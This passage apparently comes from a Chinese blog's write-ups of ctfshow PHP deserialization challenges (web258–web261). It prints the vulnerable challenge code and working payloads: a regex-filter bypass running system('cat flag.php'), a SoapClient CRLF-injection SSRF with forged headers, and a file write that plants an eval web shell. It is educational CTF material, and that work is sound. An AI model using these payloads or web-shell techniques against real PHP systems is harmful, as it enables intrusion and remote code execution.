punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">user</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">backDoor</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[oc]:\\d+:/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这个题比起上面加上了过滤</p>\n<pre><code>/[oc]:\\d+:/i`。意思是过滤这两种情况：`o:数字:`与`c:数字:\n</code></pre>\n<p>加上一个 + 绕过即可</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">backDoor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">backDoor</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"system('cat flag.php');\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">//echo \"\\n\";</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'O:'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'O:+'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">//echo \"\\n\";</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">//O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302203124133.png\" alt=\"image-20230302203124133\" /></p>\n<h2 id=\"web259-socapclient\"><a class=\"anchor\" href=\"#web259-socapclient\">#</a> web259-SocapClient</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$vip</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'vip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//vip can get flag one key</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$vip</span><span class=\"token operator\">-></span><span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>这里就一个反序列化，然后就调用 getflag 函数，可以想到是原生类的使用，__call () 函数，是当调用未知函数时自动触发，而在 SocapClient 原生类中会有 call 函数可以进行 SSRF</p>\n<p>这里给的的 flag.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$xff</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">','</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">array_pop</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_pop</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ip</span><span class=\"token operator\">!==</span><span class=\"token string single-quoted-string\">'127.0.0.1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token variable\">$token</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.txt'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里限制了 ip 为 127.0.0.1</p>\n<p>$_SERVER ['HTTP_X_FORWARDED_FOR'] 要 array_pop 两次，取第二次的值赋值给 $IP,post 传入的 token 如果 ===ctfshow 就会把 $flag 的值写入 flag.txt 里面</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$ua</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"ctfshow\\r\\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$client</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'uri'</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"127.0.0.1/\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'location'</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"http://127.0.0.1/flag.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'user_agent'</span><span class=\"token operator\">=></span><span class=\"token variable\">$ua</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$client</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">//O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A132%3A%22kradress%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span></span></pre></td></tr></table></figure><p>访问 flag.txt 查看 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302221314104.png\" alt=\"image-20230302221314104\" /></p>\n<h2 id=\"web260\"><a class=\"anchor\" href=\"#web260\">#</a> web260</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ctfshow_i_love_36D/'</span><span class=\"token punctuation\">,</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>看到题我还懵了一下，属实没想到，上一题还在 SSRF，下一题又随便传个参就过了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304111406708.png\" alt=\"image-20230304111406708\" /></p>\n<h2 id=\"web261\"><a class=\"anchor\" href=\"#web261\">#</a> web261</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshowvip</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">||</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token operator\">==</span><span class=\"token number\">0x36d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'vip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>这一题稍微有点意思，但不多，首先简单说一下上面用到几个方法</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__construct<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>构造函数，类实例化时自动调用</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>__invoke<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>调用函数的方式调用一个对象时的回应方法</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>__wakeu<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>反序列化后自动调用</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>__sleep<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>序列化时会自动调用</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> __unserialize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>在unserialize函数执行前会先检查有无此函数，如果又，优先级最高</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> __destruct<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>在类的一个对象被删除时自动调用</pre></td></tr></table></figure><p>整个程序执行时，先进__unserialize 函数，但是在__unserialize 函数中没有能够进入__invoke 函数的方法，这里只能通过在对象被删除时制动调用__destruct 来写文件，故这里只需要满足 code 为 0x36d=877 即可</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshowvip</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"877.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'&lt;?php eval($_POST[1]);'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token number\">0x36d</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfshowvip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span 